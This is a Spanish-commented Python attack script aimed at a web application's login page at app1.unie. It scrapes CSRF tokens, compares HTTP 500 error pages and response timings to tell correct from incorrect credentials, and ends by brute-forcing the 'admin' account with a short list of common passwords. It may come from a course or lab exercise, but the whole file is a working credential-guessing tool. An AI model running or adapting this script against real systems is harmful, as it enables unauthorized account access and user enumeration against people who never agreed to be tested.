#!/usr/bin/env python3
import requests
import re
import time
from difflib import SequenceMatcher

def analyze_500_responses():
    """Analizar diferencias entre respuestas 500 de login correcto vs incorrecto"""
    base_url = "http://app1.unie"
    login_url = f"{base_url}/users/login/"
    
    print("🔍 ANÁLISIS DE RESPUESTAS 500 - Buscando diferencias sutiles\n")
    
    # Primero recolectar respuestas para comparar
    responses = {}
    
    test_cases = [
        ("admin", "admin", "CORRECTA"),
        ("admin", "wrongpassword", "incorrecta"),
        ("nonexistent", "anypassword", "usuario_inexistente")
    ]
    
    for username, password, tipo in test_cases:
        print(f"📥 Recolectando respuesta para {username}:{password} ({tipo})...")
        
        session = requests.Session()
        
        try:
            # Obtener CSRF
            get_response = session.get(login_url)
            csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_response.text)
            
            if csrf_match:
                data = {
                    'username': username,
                    'password': password,
                    'csrfmiddlewaretoken': csrf_match.group(1),
                    'next': ''
                }
                
                # Hacer POST
                post_response = session.post(login_url, data=data)
                responses[(username, password)] = {
                    'status': post_response.status_code,
                    'content': post_response.text,
                    'headers': dict(post_response.headers),
                    'cookies': session.cookies.get_dict(),
                    'url': post_response.url
                }
                
                print(f"   Status: {post_response.status_code}")
                print(f"   Content Length: {len(post_response.text)}")
                print(f"   Cookies: {session.cookies.get_dict()}")
                
        except Exception as e:
            print(f"   Error: {e}")
        
        time.sleep(1)
    
    return responses

def find_content_differences(responses):
    """Encontrar diferencias en el contenido HTML de las respuestas"""
    print("\n🔍 BUSCANDO DIFERENCIAS EN EL CONTENIDO\n")
    
    # Comparar respuestas dos a dos
    keys = list(responses.keys())
    
    for i in range(len(keys)):
        for j in range(i + 1, len(keys)):
            key1, key2 = keys[i], keys[j]
            resp1, resp2 = responses[key1], responses[key2]
            
            if resp1['status'] == 500 and resp2['status'] == 500:
                print(f"Comparando {key1} vs {key2}:")
                
                # Comparar longitudes
                len1, len2 = len(resp1['content']), len(resp2['content'])
                print(f"   Longitudes: {len1} vs {len2} (diferencia: {abs(len1 - len2)})")
                
                # Buscar diferencias específicas
                diff_ratio = SequenceMatcher(None, resp1['content'], resp2['content']).ratio()
                print(f"   Similitud: {diff_ratio:.3f}")
                
                # Buscar mensajes de error diferentes
                error_patterns = [
                    'error', 'invalid', 'incorrect', 'success', 'logged',
                    'bienvenido', 'welcome', 'dashboard', 'logout'
                ]
                
                for pattern in error_patterns:
                    count1 = resp1['content'].lower().count(pattern)
                    count2 = resp2['content'].lower().count(pattern)
                    if count1 != count2:
                        print(f"   '{pattern}': {count1} vs {count2}")
                
                # Comparar cookies
                if resp1['cookies'] != resp2['cookies']:
                    print(f"   Cookies diferentes: {resp1['cookies']} vs {resp2['cookies']}")
                
                print()

def detect_by_timing_analysis():
    """Detección por análisis de tiempos de respuesta"""
    base_url = "http://app1.unie"
    login_url = f"{base_url}/users/login/"
    
    print("⏱️ ANÁLISIS DE TIEMPOS DE RESPUESTA\n")
    
    passwords = ["admin", "password", "wrong123"]
    timing_results = {}
    
    for password in passwords:
        print(f"⏰ Midiente tiempo para '{password}'...")
        
        session = requests.Session()
        
        # Obtener CSRF
        start_get = time.time()
        get_response = session.get(login_url)
        time_get = time.time() - start_get
        
        csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_response.text)
        
        if csrf_match:
            data = {
                'username': 'admin',
                'password': password,
                'csrfmiddlewaretoken': csrf_match.group(1),
                'next': ''
            }
            
            # Medir tiempo del POST
            start_post = time.time()
            post_response = session.post(login_url, data=data)
            time_post = time.time() - start_post
            
            timing_results[password] = {
                'get_time': time_get,
                'post_time': time_post,
                'status': post_response.status_code
            }
            
            print(f"   GET: {time_get:.3f}s, POST: {time_post:.3f}s, Status: {post_response.status_code}")
        
        time.sleep(1)  # Esperar entre requests
    
    # Analizar resultados de timing
    print("\n📊 ANÁLISIS DE TIEMPOS:")
    for pwd, times in timing_results.items():
        print(f"   {pwd}: POST = {times['post_time']:.3f}s")
    
    # Si hay diferencias significativas, podría indicar contraseña correcta
    return timing_results

def advanced_error_analysis():
    """Análisis avanzado de mensajes de error"""
    base_url = "http://app1.unie"
    login_url = f"{base_url}/users/login/"
    
    print("\n🔍 ANÁLISIS AVANZADO DE ERRORES\n")
    
    # Probar diferentes escenarios
    scenarios = [
        {"user": "admin", "pwd": "admin", "desc": "Credenciales correctas"},
        {"user": "admin", "pwd": "x", "desc": "Contraseña muy corta"},
        {"user": "x", "pwd": "x", "desc": "Usuario muy corto"},
        {"user": "admin", "pwd": "wrongpassword", "desc": "Contraseña incorrecta"},
        {"user": "nonexistentuser", "pwd": "any", "desc": "Usuario inexistente"}
    ]
    
    for scenario in scenarios:
        session = requests.Session()
        
        try:
            # Obtener CSRF
            get_response = session.get(login_url)
            csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_response.text)
            
            if csrf_match:
                data = {
                    'username': scenario["user"],
                    'password': scenario["pwd"],
                    'csrfmiddlewaretoken': csrf_match.group(1),
                    'next': ''
                }
                
                post_response = session.post(login_url, data=data)
                
                print(f"🎯 {scenario['desc']} ({scenario['user']}:{scenario['pwd']}):")
                print(f"   Status: {post_response.status_code}")
                print(f"   URL: {post_response.url}")
                
                # Buscar mensajes específicos en el HTML
                content = post_response.text.lower()
                
                # Patrones a buscar
                patterns = {
                    'csrf': 'csrf',
                    'error': 'error',
                    'invalid': 'invalid',
                    'incorrect': 'incorrect',
                    'field': 'field',
                    'required': 'required',
                    'validation': 'validation',
                    'success': 'success'
                }
                
                for pattern_name, pattern in patterns.items():
                    if pattern in content:
                        print(f"   Contiene '{pattern_name}': SÍ")
                
                # Verificar si hay diferencias en forms o campos
                if 'form' in content:
                    print(f"   Contiene form: SÍ")
                
                print(f"   Longitud contenido: {len(post_response.text)}")
                print()
                
        except Exception as e:
            print(f"❌ Error en {scenario['desc']}: {e}")
        
        time.sleep(0.5)

def brute_force_simple():
    """Fuerza bruta simple con análisis detallado"""
    base_url = "http://app1.unie"
    login_url = f"{base_url}/users/login/"
    
    print("🎯 FUERZA BRATA CON ANÁLISIS DETALLADO\n")
    
    common_passwords = ["admin", "password", "123456", "admin123", "root"]
    
    for pwd in common_passwords:
        session = requests.Session()
        
        print(f"🔓 Probando: 'admin':'{pwd}'")
        
        try:
            # Obtener página de login
            get_response = session.get(login_url)
            csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', get_response.text)
            
            if not csrf_match:
                print("   ❌ No se pudo obtener CSRF")
                continue
            
            # Preparar datos
            data = {
                'username': 'admin',
                'password': pwd,
                'csrfmiddlewaretoken': csrf_match.group(1),
                'next': ''
            }
            
            # Enviar login
            response = session.post(login_url, data=data)
            
            print(f"   Status: {response.status_code}")
            print(f"   URL final: {response.url}")
            print(f"   Longitud: {len(response.text)}")
            print(f"   Cookies: {session.cookies.get_dict()}")
            
            # CRITERIO: Si la URL cambió o hay cookies de sesión, podría ser éxito
            if 'login' not in response.url or session.cookies.get_dict():
                print(f"   🚨 POSIBLE ÉXITO - URL diferente o cookies presentes")
            
            # Buscar indicadores en el contenido
            if 'error' not in response.text.lower() and 'invalid' not in response.text.lower():
                print(f"   💡 Sin mensajes de error evidentes")
            
            print()
            
            # Si encontramos algo prometedor, profundizar
            if pwd == "admin" and response.status_code == 500:
                print("   🔍 Profundizando en respuesta para 'admin'...")
                # Guardar respuesta para análisis
                with open(f"response_admin.html", "w") as f:
                    f.write(response.text)
                print("   📁 Respuesta guardada en response_admin.html")
            
        except Exception as e:
            print(f"   ❌ Error: {e}")
        
        time.sleep(0.5)

if __name__ == "__main__":
    print("=" * 70)
    print("ANÁLISIS COMPLETO - RESPUESTAS 500")
    print("=" + "=" * 70)
    
    # Ejecutar diferentes métodos de análisis
    responses = analyze_500_responses()
    find_content_differences(responses)
    
    timing_results = detect_by_timing_analysis()
    advanced_error_analysis()
    
    print("\n" + "🎯" * 20)
    print("EJECUTANDO FUERZA BRUTA FINAL")
    print("🎯" * 20)
    brute_force_simple()